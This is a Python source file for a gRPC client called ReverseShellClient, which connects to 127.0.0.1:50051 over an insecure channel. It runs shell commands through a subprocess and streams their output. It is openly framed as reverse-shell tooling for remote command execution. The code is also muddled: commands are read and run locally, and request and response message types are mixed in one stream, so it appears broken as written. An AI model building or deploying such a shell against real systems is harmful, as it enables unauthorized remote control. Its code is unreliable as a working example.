import grpc
import asyncio
import subprocess
import reverse_shell_pb2
import reverse_shell_pb2_grpc

class ReverseShellClient:
    def __init__(self, channel):
        self.stub = reverse_shell_pb2_grpc.ReverseShellServiceStub(channel)

    async def start_session(self):
        # Start the session with the server and send commands
        response_stream = self.stub.StartSession(self.command_generator())
        async for response in response_stream:
            print(response.output, end='')

    async def command_generator(self):
        while True:
            command = input("$ ")
            yield reverse_shell_pb2.CommandRequest(command=command)

            process = await asyncio.create_subprocess_shell(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            while True:
                output = await process.stdout.read(1024)
                if output:
                    yield reverse_shell_pb2.CommandResponse(output=output.decode(), is_active=True)
                else:
                    break

            stderr = await process.stderr.read()
            if stderr:
                yield reverse_shell_pb2.CommandResponse(output=stderr.decode(), is_active=True)

            yield reverse_shell_pb2.CommandResponse(output='', is_active=False)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    channel = grpc.aio.insecure_channel('127.0.0.1:50051')
    client = ReverseShellClient(channel)
    loop.run_until_complete(client.start_session())